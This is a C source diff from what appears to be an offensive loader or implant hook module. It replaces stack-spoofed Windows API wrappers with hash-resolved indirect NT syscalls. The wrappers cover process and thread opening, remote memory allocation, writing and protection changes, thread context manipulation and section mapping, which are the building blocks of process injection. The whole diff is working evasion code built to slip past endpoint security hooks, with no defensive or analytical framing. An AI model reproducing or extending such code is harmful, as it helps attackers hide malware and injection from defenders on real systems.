@@ -4,37 +4,95 @@
 #include "tcg.h"
 #include "memory.h"
 #include "spoof.h"
+#include "syscalls.h"
 
-DECLSPEC_IMPORT HINTERNET WINAPI WININET$InternetConnectA    ( HINTERNET, LPCSTR, INTERNET_PORT, LPCSTR, LPCSTR, DWORD, DWORD, DWORD_PTR );
-DECLSPEC_IMPORT HINTERNET WINAPI WININET$InternetOpenA       ( LPCSTR, DWORD, LPCSTR, LPCSTR, DWORD );
-DECLSPEC_IMPORT BOOL      WINAPI KERNEL32$CloseHandle        ( HANDLE );
-DECLSPEC_IMPORT HANDLE    WINAPI KERNEL32$CreateFileMappingA ( HANDLE, LPSECURITY_ATTRIBUTES, DWORD, DWORD, DWORD, LPCSTR );
-DECLSPEC_IMPORT BOOL      WINAPI KERNEL32$CreateProcessA     ( LPCSTR, LPSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, BOOL, DWORD, LPVOID, LPCSTR, LPSTARTUPINFOA, LPPROCESS_INFORMATION );
-DECLSPEC_IMPORT HANDLE    WINAPI KERNEL32$CreateRemoteThread ( HANDLE, LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD );
-DECLSPEC_IMPORT HANDLE    WINAPI KERNEL32$CreateThread       ( LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD );
-DECLSPEC_IMPORT BOOL      WINAPI KERNEL32$DuplicateHandle    ( HANDLE, HANDLE, HANDLE, LPHANDLE, DWORD, BOOL, DWORD );
-DECLSPEC_IMPORT BOOL      WINAPI KERNEL32$GetThreadContext   ( HANDLE, LPCONTEXT );
-DECLSPEC_IMPORT HMODULE   WINAPI KERNEL32$LoadLibraryA       ( LPCSTR );
-DECLSPEC_IMPORT LPVOID    WINAPI KERNEL32$MapViewOfFile      ( HANDLE, DWORD, DWORD, DWORD, SIZE_T );
-DECLSPEC_IMPORT HANDLE    WINAPI KERNEL32$OpenProcess        ( DWORD, BOOL, DWORD );
-DECLSPEC_IMPORT HANDLE    WINAPI KERNEL32$OpenThread         ( DWORD, BOOL, DWORD );
-DECLSPEC_IMPORT BOOL      WINAPI KERNEL32$ReadProcessMemory  ( HANDLE, LPCVOID, LPVOID, SIZE_T, SIZE_T * );
-DECLSPEC_IMPORT DWORD     WINAPI KERNEL32$ResumeThread       ( HANDLE );
-DECLSPEC_IMPORT VOID      WINAPI KERNEL32$RtlCaptureContext  ( PCONTEXT );
-DECLSPEC_IMPORT BOOL      WINAPI KERNEL32$SetThreadContext   ( HANDLE, const CONTEXT * );
-DECLSPEC_IMPORT BOOL      WINAPI KERNEL32$UnmapViewOfFile    ( LPCVOID );
-DECLSPEC_IMPORT LPVOID    WINAPI KERNEL32$VirtualAlloc       ( LPVOID, SIZE_T, DWORD, DWORD );
-DECLSPEC_IMPORT LPVOID    WINAPI KERNEL32$VirtualAllocEx     ( HANDLE, LPVOID, SIZE_T, DWORD, DWORD );
-DECLSPEC_IMPORT BOOL      WINAPI KERNEL32$VirtualFree        ( LPVOID, SIZE_T, DWORD );
-DECLSPEC_IMPORT BOOL      WINAPI KERNEL32$VirtualProtect     ( LPVOID, SIZE_T, DWORD, PDWORD );
-DECLSPEC_IMPORT BOOL      WINAPI KERNEL32$VirtualProtectEx   ( HANDLE, LPVOID, SIZE_T, DWORD, PDWORD );
-DECLSPEC_IMPORT SIZE_T    WINAPI KERNEL32$VirtualQuery       ( LPCVOID, PMEMORY_BASIC_INFORMATION, SIZE_T );
-DECLSPEC_IMPORT BOOL      WINAPI KERNEL32$WriteProcessMemory ( HANDLE, LPVOID, LPCVOID, SIZE_T, SIZE_T * );
-DECLSPEC_IMPORT HRESULT   WINAPI OLE32$CoCreateInstance      ( REFCLSID, LPUNKNOWN, DWORD, REFIID, LPVOID * );
-DECLSPEC_IMPORT ULONG     NTAPI  NTDLL$NtContinue            ( CONTEXT *, BOOLEAN );
+DECLSPEC_IMPORT HINTERNET WINAPI WININET$InternetConnectA ( HINTERNET, LPCSTR, INTERNET_PORT, LPCSTR, LPCSTR, DWORD, DWORD, DWORD_PTR );
+DECLSPEC_IMPORT HINTERNET WINAPI WININET$InternetOpenA    ( LPCSTR, DWORD, LPCSTR, LPCSTR, DWORD );
+
+DECLSPEC_IMPORT BOOL   WINAPI KERNEL32$CreateProcessA        ( LPCSTR, LPSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, BOOL, DWORD, LPVOID, LPCSTR, LPSTARTUPINFOA, LPPROCESS_INFORMATION );
+DECLSPEC_IMPORT HANDLE WINAPI KERNEL32$CreateRemoteThread    ( HANDLE, LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD );
+DECLSPEC_IMPORT HANDLE WINAPI KERNEL32$CreateThread          ( LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD );
+DECLSPEC_IMPORT VOID   WINAPI KERNEL32$RtlCaptureContext     ( PCONTEXT );
+
+DECLSPEC_IMPORT HRESULT WINAPI OLE32$CoCreateInstance ( REFCLSID, LPUNKNOWN, DWORD, REFIID, LPVOID * );
+
+DECLSPEC_IMPORT ULONG  NTAPI  NTDLL$NtContinue ( CONTEXT *, BOOLEAN );
+
+// Use utils\hash.py to generate these hashes
+#define NTDLL_HASH                   0x3CFA685D
+#define NTALLOCATEVIRTUALMEMORY_HASH 0xD33BCABD
+#define NTFREEVIRTUALMEMORY_HASH     0xDB63B5AB
+#define NTPROTECTVIRTUALMEMORY_HASH  0x8C394D89
+#define NTQUERYVIRTUALMEMORY_HASH    0x4F138492
+#define NTWRITEVIRTUALMEMORY_HASH    0xC5108CC2
+#define NTREADVIRTUALMEMORY_HASH     0x3AEFA5AA
+#define NTCLOSE_HASH                 0xDCD44C5F
+#define NTOPENPROCESS_HASH           0xF0CA9CA0
+#define NTOPENTHREAD_HASH            0x59651E8C
+#define NTDUPLICATEOBJECT_HASH       0xB55C7785
+#define NTCREATETHREADEX_HASH        0x4D1DEB74
+#define NTGETCONTEXTTHREAD_HASH      0xE935E393
+#define NTSETCONTEXTTHREAD_HASH      0x6935E395
+#define NTRESUMETHREAD_HASH          0xC54A46C8
+#define NTMAPVIEWOFSECTION_HASH      0xD5159B94
+#define NTUNMAPVIEWOFSECTION_HASH    0xF21037D0
+#define NTCREATESECTION_HASH         0x5BB29BCB
+
+// NT structures and constants
+#ifndef OBJ_INHERIT
+#define OBJ_INHERIT 0x00000002
+#endif
+
+#ifndef SECTION_ALL_ACCESS
+#define SECTION_ALL_ACCESS 0x000F001F
+#endif
+
+#ifndef SEC_COMMIT
+#define SEC_COMMIT 0x08000000
+#endif
+
+typedef struct _UNICODE_STRING {
+    USHORT Length;
+    USHORT MaximumLength;
+    PWSTR  Buffer;
+} UNICODE_STRING, *PUNICODE_STRING;
+
+typedef struct _OBJECT_ATTRIBUTES {
+    ULONG Length;
+    HANDLE RootDirectory;
+    PUNICODE_STRING ObjectName;
+    ULONG Attributes;
+    PVOID SecurityDescriptor;
+    PVOID SecurityQualityOfService;
+} OBJECT_ATTRIBUTES, *POBJECT_ATTRIBUTES;
+
+typedef struct _CLIENT_ID {
+    HANDLE UniqueProcess;
+    HANDLE UniqueThread;
+} CLIENT_ID, *PCLIENT_ID;
+
+// cannot put this here because it fails to build
+// to PIC when hooks.x64.o is merged into the loader
+// extern MEMORY_LAYOUT g_memory;
+
+// Helper function to prepare NT syscalls - reduces code duplication
+static inline BOOL prepare_nt_syscall ( DWORD moduleHash,  DWORD functionHash, SYSCALL * syscall ) 
+{
+    PVOID moduledll = findModuleByHash ( moduleHash );
+    PVOID fn = findFunctionByHash ( moduledll, functionHash );
+    
+    if ( ! resolve_syscall ( syscall, moduledll, fn ) ) {
+        return FALSE;
+    }
+    
+    prepare_syscall ( syscall->ssn, syscall->gate );
+    return TRUE;
+}
 
 HINTERNET WINAPI _InternetOpenA ( LPCSTR lpszAgent, DWORD dwAccessType, LPCSTR lpszProxy, LPCSTR lpszProxyBypass, DWORD dwFlags )
 {
+    // NOTE: WinINet functions like InternetOpenA are high-level APIs with no direct NT syscall equivalents.
+    // They internally use multiple syscalls and complex logic. Using Win API call with stack spoofing.
     FUNCTION_CALL call = { 0 };
 
     call.ptr        = ( PVOID ) ( WININET$InternetOpenA );
@@ -50,6 +108,8 @@ HINTERNET WINAPI _InternetOpenA ( LPCSTR lpszAgent, DWORD dwAccessType, LPCSTR l
 
 HINTERNET WINAPI _InternetConnectA ( HINTERNET hInternet, LPCSTR lpszServerName, INTERNET_PORT nServerPort, LPCSTR lpszUserName, LPCSTR lpszPassword, DWORD dwService, DWORD dwFlags, DWORD_PTR dwContext )
 {
+    // NOTE: WinINet functions like InternetConnectA are high-level APIs with no direct NT syscall equivalents.
+    // They internally use multiple syscalls and complex logic. Using Win API call with stack spoofing.
     FUNCTION_CALL call = { 0 };
 
     call.ptr        = ( PVOID ) ( WININET$InternetConnectA );
@@ -68,35 +128,34 @@ HINTERNET WINAPI _InternetConnectA ( HINTERNET hInternet, LPCSTR lpszServerName,
 
 BOOL WINAPI _CloseHandle ( HANDLE hObject )
 {
-    FUNCTION_CALL call = { 0 };
-
-    call.ptr  = ( PVOID ) ( KERNEL32$CloseHandle );
-    call.argc = 1;
-    
-    call.args [ 0 ] = spoof_arg ( hObject );
-
-    return ( BOOL ) spoof_call ( &call );
+    SYSCALL syscall = { 0 };
+    if ( ! prepare_nt_syscall ( NTDLL_HASH, NTCLOSE_HASH, &syscall ) ) return FALSE;
+    return ( NTSTATUS ) do_syscall ( hObject ) == 0;
 }
 
 HANDLE WINAPI _CreateFileMappingA ( HANDLE hFile, LPSECURITY_ATTRIBUTES lpFileMappingAttributes, DWORD flProtect, DWORD dwMaximumSizeHigh, DWORD dwMaximumSizeLow, LPCSTR lpName )
 {
-    FUNCTION_CALL call = { 0 };
-
-    call.ptr  = ( PVOID ) ( KERNEL32$CreateFileMappingA );
-    call.argc = 6;
-
-    call.args [ 0 ] = spoof_arg ( hFile );
-    call.args [ 1 ] = spoof_arg ( lpFileMappingAttributes );
-    call.args [ 2 ] = spoof_arg ( flProtect );
-    call.args [ 3 ] = spoof_arg ( dwMaximumSizeHigh );
-    call.args [ 4 ] = spoof_arg ( dwMaximumSizeLow );
-    call.args [ 5 ] = spoof_arg ( lpName );
-
-    return ( HANDLE ) spoof_call ( &call );
+    SYSCALL syscall = { 0 };
+    HANDLE hSection = NULL;
+    LARGE_INTEGER maxSize;
+    OBJECT_ATTRIBUTES oa = { sizeof(oa), 0, 0, 0, 0, 0 };
+    
+    if ( ! prepare_nt_syscall ( NTDLL_HASH, NTCREATESECTION_HASH, &syscall ) ) return NULL;
+    
+    maxSize.HighPart = dwMaximumSizeHigh;
+    maxSize.LowPart = dwMaximumSizeLow;
+    
+    if ( ( NTSTATUS ) do_syscall ( &hSection, SECTION_ALL_ACCESS, &oa, &maxSize, flProtect, SEC_COMMIT, hFile ) == 0 ) {
+        return hSection;
+    }
+    return NULL;
 }
 
 BOOL _CreateProcessA ( LPCSTR lpApplicationName, LPSTR lpCommandLine, LPSECURITY_ATTRIBUTES lpProcessAttributes, LPSECURITY_ATTRIBUTES lpThreadAttributes, BOOL bInheritHandles, DWORD dwCreationFlags, LPVOID lpEnvironment, LPCSTR lpCurrentDirectory, LPSTARTUPINFOA lpStartupInfo, LPPROCESS_INFORMATION lpProcessInformation )
 {
+    // NOTE: The NT syscall equivalent (NtCreateUserProcess) is extremely complex with numerous
+    // structures and parameters that would be difficult to implement correctly.
+    // Using Win API call with stack spoofing for simplicity and reliability.
     FUNCTION_CALL call = { 0 };
 
     call.ptr  = ( PVOID ) ( KERNEL32$CreateProcessA );
@@ -118,6 +177,9 @@ BOOL _CreateProcessA ( LPCSTR lpApplicationName, LPSTR lpCommandLine, LPSECURITY
 
 HANDLE WINAPI _CreateRemoteThread ( HANDLE hProcess, LPSECURITY_ATTRIBUTES lpThreadAttributes, SIZE_T dwStackSize, LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter, DWORD dwCreationFlags, LPDWORD lpThreadId )
 {
+    // NOTE: Attempted to convert to NtCreateThreadEx syscall but it didn't work properly.
+    // The syscall implementation had issues with parameter ordering and flag conversion.
+    // Reverting to Win API call with stack spoofing.
     FUNCTION_CALL call = { 0 };
 
     call.ptr  = ( PVOID ) ( KERNEL32$CreateRemoteThread );
@@ -136,6 +198,9 @@ HANDLE WINAPI _CreateRemoteThread ( HANDLE hProcess, LPSECURITY_ATTRIBUTES lpThr
 
 HANDLE WINAPI _CreateThread ( LPSECURITY_ATTRIBUTES lpThreadAttributes, SIZE_T dwStackSize, LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter, DWORD dwCreationFlags, LPDWORD lpThreadId )
 {
+    // NOTE: Attempted to convert to NtCreateThreadEx syscall but it didn't work properly.
+    // The syscall implementation had issues with parameter ordering and flag conversion.
+    // Reverting to Win API call with stack spoofing.
     FUNCTION_CALL call = { 0 };
 
     call.ptr  = ( PVOID ) ( KERNEL32$CreateThread );
@@ -153,6 +218,9 @@ HANDLE WINAPI _CreateThread ( LPSECURITY_ATTRIBUTES lpThreadAttributes, SIZE_T d
 
 HRESULT WINAPI _CoCreateInstance ( REFCLSID rclsid, LPUNKNOWN pUnkOuter, DWORD dwClsContext, REFIID riid, LPVOID * ppv )
 {
+    // NOTE: COM functions like CoCreateInstance have no direct NT syscall equivalents.
+    // COM is a high-level framework built on top of many lower-level APIs.
+    // Using Win API call with stack spoofing.
     FUNCTION_CALL call = { 0 };
 
     call.ptr  = ( PVOID ) ( OLE32$CoCreateInstance );
@@ -169,24 +237,16 @@ HRESULT WINAPI _CoCreateInstance ( REFCLSID rclsid, LPUNKNOWN pUnkOuter, DWORD d
 
 BOOL WINAPI _DuplicateHandle ( HANDLE hSourceProcessHandle, HANDLE hSourceHandle, HANDLE hTargetProcessHandle, LPHANDLE lpTargetHandle, DWORD dwDesiredAccess, BOOL bInheritHandle, DWORD dwOptions )
 {
-    FUNCTION_CALL call = { 0 };
-
-    call.ptr  = ( PVOID ) ( KERNEL32$DuplicateHandle );
-    call.argc = 7;
-    
-    call.args [ 0 ] = spoof_arg ( hSourceProcessHandle );
-    call.args [ 1 ] = spoof_arg ( hSourceHandle );
-    call.args [ 2 ] = spoof_arg ( hTargetProcessHandle );
-    call.args [ 3 ] = spoof_arg ( lpTargetHandle );
-    call.args [ 4 ] = spoof_arg ( dwDesiredAccess );
-    call.args [ 5 ] = spoof_arg ( bInheritHandle );
-    call.args [ 6 ] = spoof_arg ( dwOptions );
-
-    return ( BOOL ) spoof_call ( &call );
+    SYSCALL syscall = { 0 };
+    if ( ! prepare_nt_syscall ( NTDLL_HASH, NTDUPLICATEOBJECT_HASH, &syscall ) ) return FALSE;
+    return ( NTSTATUS ) do_syscall ( hSourceProcessHandle, hSourceHandle, hTargetProcessHandle, lpTargetHandle, dwDesiredAccess, bInheritHandle ? OBJ_INHERIT : 0, dwOptions ) == 0;
 }
 
 HMODULE WINAPI _LoadLibraryA ( LPCSTR lpLibFileName )
 {
+    // NOTE: LdrLoadDll is not a syscall - it's a regular exported function from ntdll.dll.
+    // There is no direct NT syscall for loading libraries; LdrLoadDll itself uses multiple syscalls internally.
+    // Using Win API call with stack spoofing.
     FUNCTION_CALL call = { 0 };
 
     call.ptr  = ( PVOID ) ( KERNEL32$LoadLibraryA );
@@ -199,216 +259,136 @@ HMODULE WINAPI _LoadLibraryA ( LPCSTR lpLibFileName )
 
 BOOL WINAPI _GetThreadContext ( HANDLE hThread, LPCONTEXT lpContext )
 {
-    FUNCTION_CALL call = { 0 };
-
-    call.ptr  = ( PVOID ) ( KERNEL32$GetThreadContext );
-    call.argc = 2;
-    
-    call.args [ 0 ] = spoof_arg ( hThread );
-    call.args [ 1 ] = spoof_arg ( lpContext );
-
-    return ( BOOL ) spoof_call ( &call );
+    SYSCALL syscall = { 0 };
+    if ( ! prepare_nt_syscall ( NTDLL_HASH, NTGETCONTEXTTHREAD_HASH, &syscall ) ) return FALSE;
+    return ( NTSTATUS ) do_syscall ( hThread, lpContext ) == 0;
 }
 
 LPVOID WINAPI _MapViewOfFile ( HANDLE hFileMappingObject, DWORD dwDesiredAccess, DWORD dwFileOffsetHigh, DWORD dwFileOffsetLow, SIZE_T dwNumberOfBytesToMap )
 {
-    FUNCTION_CALL call = { 0 };
-
-    call.ptr  = ( PVOID ) ( KERNEL32$MapViewOfFile );
-    call.argc = 5;
+    SYSCALL syscall = { 0 };
+    PVOID baseAddress = NULL;
+    SIZE_T viewSize = dwNumberOfBytesToMap;
+    LARGE_INTEGER sectionOffset;
     
-    call.args [ 0 ] = spoof_arg ( hFileMappingObject );
-    call.args [ 1 ] = spoof_arg ( dwDesiredAccess );
-    call.args [ 2 ] = spoof_arg ( dwFileOffsetHigh );
-    call.args [ 3 ] = spoof_arg ( dwFileOffsetLow );
-    call.args [ 4 ] = spoof_arg ( dwNumberOfBytesToMap );
-
-    return ( LPVOID ) spoof_call ( &call );
+    if ( ! prepare_nt_syscall ( NTDLL_HASH, NTMAPVIEWOFSECTION_HASH, &syscall ) ) return NULL;
+    
+    sectionOffset.HighPart = dwFileOffsetHigh;
+    sectionOffset.LowPart = dwFileOffsetLow;
+    
+    if ( ( NTSTATUS ) do_syscall ( hFileMappingObject, ( HANDLE ) ( -1 ), &baseAddress, 0, 0, &sectionOffset, &viewSize, 1, 0, PAGE_READWRITE ) == 0 ) {
+        return baseAddress;
+    }
+    return NULL;
 }
 
 HANDLE WINAPI _OpenProcess ( DWORD dwDesiredAccess, BOOL bInheritHandle, DWORD dwProcessId )
 {
-    FUNCTION_CALL call = { 0 };
+    SYSCALL syscall = { 0 };
+    HANDLE hProcess = NULL;
+    OBJECT_ATTRIBUTES oa = { sizeof(oa), 0, 0, 0, 0, 0 };
+    CLIENT_ID cid = { (HANDLE)(DWORD_PTR)dwProcessId, 0 };
 
-    call.ptr  = ( PVOID ) ( KERNEL32$OpenProcess );
-    call.argc = 3;
-    
-    call.args [ 0 ] = spoof_arg ( dwDesiredAccess );
-    call.args [ 1 ] = spoof_arg ( bInheritHandle );
-    call.args [ 2 ] = spoof_arg ( dwProcessId );
-
-    return ( HANDLE ) spoof_call ( &call );
+    if ( ! prepare_nt_syscall ( NTDLL_HASH, NTOPENPROCESS_HASH, &syscall ) ) return NULL;
+    do_syscall ( &hProcess, dwDesiredAccess, &oa, &cid );
+    return hProcess;
 }
 
 HANDLE WINAPI _OpenThread ( DWORD dwDesiredAccess, BOOL bInheritHandle, DWORD dwThreadId )
 {
-    FUNCTION_CALL call = { 0 };
+    SYSCALL syscall = { 0 };
+    HANDLE hThread = NULL;
+    OBJECT_ATTRIBUTES oa = { sizeof(oa), 0, 0, 0, 0, 0 };
+    CLIENT_ID cid = { 0, (HANDLE)(DWORD_PTR)dwThreadId };
 
-    call.ptr  = ( PVOID ) ( KERNEL32$OpenThread );
-    call.argc = 3;
-    
-    call.args [ 0 ] = spoof_arg ( dwDesiredAccess );
-    call.args [ 1 ] = spoof_arg ( bInheritHandle );
-    call.args [ 2 ] = spoof_arg ( dwThreadId );
-
-    return ( HANDLE ) spoof_call ( &call );
+    if ( ! prepare_nt_syscall ( NTDLL_HASH, NTOPENTHREAD_HASH, &syscall ) ) return NULL;
+    do_syscall ( &hThread, dwDesiredAccess, &oa, &cid );
+    return hThread;
 }
 
 BOOL WINAPI _ReadProcessMemory ( HANDLE hProcess, LPCVOID lpBaseAddress, LPVOID lpBuffer, SIZE_T nSize, SIZE_T * lpNumberOfBytesRead )
 {
-    FUNCTION_CALL call = { 0 };
-
-    call.ptr  = ( PVOID ) ( KERNEL32$ReadProcessMemory );
-    call.argc = 5;
-    
-    call.args [ 0 ] = spoof_arg ( hProcess );
-    call.args [ 1 ] = spoof_arg ( lpBaseAddress );
-    call.args [ 2 ] = spoof_arg ( lpBuffer );
-    call.args [ 3 ] = spoof_arg ( nSize );
-    call.args [ 4 ] = spoof_arg ( lpNumberOfBytesRead );
-
-    return ( BOOL ) spoof_call ( &call );
+    SYSCALL syscall = { 0 };
+    if ( ! prepare_nt_syscall ( NTDLL_HASH, NTREADVIRTUALMEMORY_HASH, &syscall ) ) return FALSE;
+    return ( NTSTATUS ) do_syscall ( hProcess, (PVOID)lpBaseAddress, lpBuffer, nSize, lpNumberOfBytesRead ) == 0;
 }
 
 DWORD WINAPI _ResumeThread ( HANDLE hThread )
 {
-    FUNCTION_CALL call = { 0 };
+    SYSCALL syscall = { 0 };
+    ULONG suspendCount = 0;
 
-    call.ptr  = ( PVOID ) ( KERNEL32$ResumeThread );
-    call.argc = 1;
-    
-    call.args [ 0 ] = spoof_arg ( hThread );
-
-    return ( DWORD ) spoof_call ( &call );
+    if ( ! prepare_nt_syscall ( NTDLL_HASH, NTRESUMETHREAD_HASH, &syscall ) ) return (DWORD)-1;
+    if ( ( NTSTATUS ) do_syscall ( hThread, &suspendCount ) == 0 ) return suspendCount;
+    return (DWORD)-1;
 }
 
 BOOL WINAPI _SetThreadContext ( HANDLE hThread, const CONTEXT * lpContext )
 {
-    FUNCTION_CALL call = { 0 };
-
-    call.ptr  = ( PVOID ) ( KERNEL32$SetThreadContext );
-    call.argc = 2;
-    
-    call.args [ 0 ] = spoof_arg ( hThread );
-    call.args [ 1 ] = spoof_arg ( lpContext );
-
-    return ( BOOL ) spoof_call ( &call );
+    SYSCALL syscall = { 0 };
+    if ( ! prepare_nt_syscall ( NTDLL_HASH, NTSETCONTEXTTHREAD_HASH, &syscall ) ) return FALSE;
+    return ( NTSTATUS ) do_syscall ( hThread, lpContext ) == 0;
 }
 
 BOOL WINAPI _UnmapViewOfFile ( LPCVOID lpBaseAddress )
 {
-    FUNCTION_CALL call = { 0 };
-
-    call.ptr  = ( PVOID ) ( KERNEL32$UnmapViewOfFile );
-    call.argc = 1;
-    
-    call.args [ 0 ] = spoof_arg ( lpBaseAddress );
-
-    return ( BOOL ) spoof_call ( &call );
+    SYSCALL syscall = { 0 };
+    if ( ! prepare_nt_syscall ( NTDLL_HASH, NTUNMAPVIEWOFSECTION_HASH, &syscall ) ) return FALSE;
+    return ( NTSTATUS ) do_syscall ( ( HANDLE ) ( -1 ), (PVOID)lpBaseAddress ) == 0;
 }
 
 LPVOID WINAPI _VirtualAlloc ( LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect )
 {
-    FUNCTION_CALL call = { 0 };
-
-    call.ptr  = ( PVOID ) ( KERNEL32$VirtualAlloc );
-    call.argc = 4;
-    
-    call.args [ 0 ] = spoof_arg ( lpAddress );
-    call.args [ 1 ] = spoof_arg ( dwSize );
-    call.args [ 2 ] = spoof_arg ( flAllocationType );
-    call.args [ 3 ] = spoof_arg ( flProtect );
-
-    return ( LPVOID ) spoof_call ( &call );
+    SYSCALL syscall = { 0 };
+    if ( ! prepare_nt_syscall ( NTDLL_HASH, NTALLOCATEVIRTUALMEMORY_HASH, &syscall ) ) return NULL;
+    do_syscall ( ( HANDLE ) ( -1 ), &lpAddress, ( ULONG_PTR ) ( 0 ), &dwSize, flAllocationType, flProtect );
+    return lpAddress;
 }
 
 LPVOID WINAPI _VirtualAllocEx ( HANDLE hProcess, LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect )
 {
-    FUNCTION_CALL call = { 0 };
-
-    call.ptr  = ( PVOID ) ( KERNEL32$VirtualAllocEx );
-    call.argc = 5;
-    
-    call.args [ 0 ] = spoof_arg ( hProcess );
-    call.args [ 1 ] = spoof_arg ( lpAddress );
-    call.args [ 2 ] = spoof_arg ( dwSize );
-    call.args [ 3 ] = spoof_arg ( flAllocationType );
-    call.args [ 4 ] = spoof_arg ( flProtect );
-
-    return ( LPVOID ) spoof_call ( &call );
+    SYSCALL syscall = { 0 };
+    if ( ! prepare_nt_syscall ( NTDLL_HASH, NTALLOCATEVIRTUALMEMORY_HASH, &syscall ) ) return NULL;
+    do_syscall ( hProcess, &lpAddress, ( ULONG_PTR ) ( 0 ), &dwSize, flAllocationType, flProtect );
+    return lpAddress;
 }
 
 BOOL WINAPI _VirtualFree ( LPVOID lpAddress, SIZE_T dwSize, DWORD dwFreeType )
 {
-    FUNCTION_CALL call = { 0 };
-
-    call.ptr  = ( PVOID ) ( KERNEL32$VirtualFree );
-    call.argc = 3;
-    
-    call.args [ 0 ] = spoof_arg ( lpAddress );
-    call.args [ 1 ] = spoof_arg ( dwSize );
-    call.args [ 2 ] = spoof_arg ( dwFreeType );
-
-    return ( BOOL ) spoof_call ( &call );
+    SYSCALL syscall = { 0 };
+    if ( ! prepare_nt_syscall ( NTDLL_HASH, NTFREEVIRTUALMEMORY_HASH, &syscall ) ) return FALSE;
+    return ( NTSTATUS ) do_syscall ( ( HANDLE ) ( -1 ), &lpAddress, &dwSize, dwFreeType ) == 0;
 }
 
 BOOL WINAPI _VirtualProtect ( LPVOID lpAddress, SIZE_T dwSize, DWORD flNewProtect, PDWORD lpflOldProtect )
 {
-    FUNCTION_CALL call = { 0 };
-
-    call.ptr  = ( PVOID ) ( KERNEL32$VirtualProtect );
-    call.argc = 4;
-    
-    call.args [ 0 ] = spoof_arg ( lpAddress );
-    call.args [ 1 ] = spoof_arg ( dwSize );
-    call.args [ 2 ] = spoof_arg ( flNewProtect );
-    call.args [ 3 ] = spoof_arg ( lpflOldProtect );
-
-    return ( BOOL ) spoof_call ( &call );
+    SYSCALL syscall = { 0 };
+    if ( ! prepare_nt_syscall ( NTDLL_HASH, NTPROTECTVIRTUALMEMORY_HASH, &syscall ) ) return FALSE;
+    return ( NTSTATUS ) do_syscall ( ( HANDLE ) ( -1 ), &lpAddress, &dwSize, flNewProtect, lpflOldProtect ) == 0;
 }
 
 BOOL WINAPI _VirtualProtectEx ( HANDLE hProcess, LPVOID lpAddress, SIZE_T dwSize, DWORD flNewProtect, PDWORD lpflOldProtect )
 {
-    FUNCTION_CALL call = { 0 };
-
-    call.ptr  = ( PVOID ) ( KERNEL32$VirtualProtectEx );
-    call.argc = 5;
-    
-    call.args [ 0 ] = spoof_arg ( hProcess );
-    call.args [ 1 ] = spoof_arg ( lpAddress );
-    call.args [ 2 ] = spoof_arg ( dwSize );
-    call.args [ 3 ] = spoof_arg ( flNewProtect );
-    call.args [ 4 ] = spoof_arg ( lpflOldProtect );
-
-    return ( BOOL ) spoof_call ( &call );
+    SYSCALL syscall = { 0 };
+    if ( ! prepare_nt_syscall ( NTDLL_HASH, NTPROTECTVIRTUALMEMORY_HASH, &syscall ) ) return FALSE;
+    return ( NTSTATUS ) do_syscall ( hProcess, &lpAddress, &dwSize, flNewProtect, lpflOldProtect ) == 0;
 }
 
 SIZE_T WINAPI _VirtualQuery ( LPCVOID lpAddress, PMEMORY_BASIC_INFORMATION lpBuffer, SIZE_T dwLength )
 {
-    FUNCTION_CALL call = { 0 };
+    SYSCALL syscall = { 0 };
+    SIZE_T returnLength = 0;
 
-    call.ptr  = ( PVOID ) ( KERNEL32$VirtualQuery );
-    call.argc = 3;
-    
-    call.args [ 0 ] = spoof_arg ( lpAddress );
-    call.args [ 1 ] = spoof_arg ( lpBuffer );
-    call.args [ 2 ] = spoof_arg ( dwLength );
-
-    return ( SIZE_T ) spoof_call ( &call );
+    if ( ! prepare_nt_syscall ( NTDLL_HASH, NTQUERYVIRTUALMEMORY_HASH, &syscall ) ) return 0;
+    if ( ( NTSTATUS ) do_syscall ( ( HANDLE ) ( -1 ), (PVOID)lpAddress, 0, lpBuffer, dwLength, &returnLength ) == 0 ) {
+        return returnLength;
+    }
+    return 0;
 }
 
 BOOL WINAPI _WriteProcessMemory ( HANDLE hProcess, LPVOID lpBaseAddress, LPCVOID lpBuffer, SIZE_T nSize, SIZE_T * lpNumberOfBytesWritten )
 {
-    FUNCTION_CALL call = { 0 };
-
-    call.ptr  = ( PVOID ) ( KERNEL32$WriteProcessMemory );
-    call.argc = 5;
-    
-    call.args [ 0 ] = spoof_arg ( hProcess );
-    call.args [ 1 ] = spoof_arg ( lpBaseAddress );
-    call.args [ 2 ] = spoof_arg ( lpBuffer );
-    call.args [ 3 ] = spoof_arg ( nSize );
-    call.args [ 4 ] = spoof_arg ( lpNumberOfBytesWritten );
-
-    return ( BOOL ) spoof_call ( &call );
+    SYSCALL syscall = { 0 };
+    if ( ! prepare_nt_syscall ( NTDLL_HASH, NTWRITEVIRTUALMEMORY_HASH, &syscall ) ) return FALSE;
+    return ( NTSTATUS ) do_syscall ( hProcess, lpBaseAddress, (PVOID)lpBuffer, nSize, lpNumberOfBytesWritten ) == 0;
 }
